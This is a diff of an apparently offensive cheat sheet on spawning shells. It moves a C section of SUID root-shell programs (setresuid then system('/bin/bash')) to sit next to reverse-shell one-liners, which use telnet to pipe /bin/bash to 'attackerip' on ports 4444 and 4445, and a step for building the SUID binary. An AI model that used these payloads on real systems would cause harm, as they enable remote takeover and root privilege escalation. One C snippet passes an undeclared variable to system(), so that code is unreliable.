@@ -247,28 +247,7 @@ exec "/bin/sh"
 os.execute("/bin/sh")
 ```
 
-## C:
-```
-#include <stdio.h>
 
-int main(int argc, char **argv)
-{
-	int status = system(bash);
-	return 0;
-}
-```
-```
-int main(void){
-    setresuid(0, 0, 0);
-    system("/bin/bash");
-}
-```
-```
-int main(void){
-       setresuid(0, 0, 0);
-       system("/bin/sh");
-}       
-```
 ## Java Reverse Shell:
 ```
 r = Runtime.getRuntime()
@@ -304,6 +283,30 @@ rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
 telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
 ```
 
+
+
+## C:
+```
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+	int status = system(bash);
+	return 0;
+}
+```
+```
+int main(void){
+    setresuid(0, 0, 0);
+    system("/bin/bash");
+}
+```
+```
+int main(void){
+       setresuid(0, 0, 0);
+       system("/bin/sh");
+}       
+```
 ### Building the SUID Shell binary
 ```
 gcc -o suid suid.c 
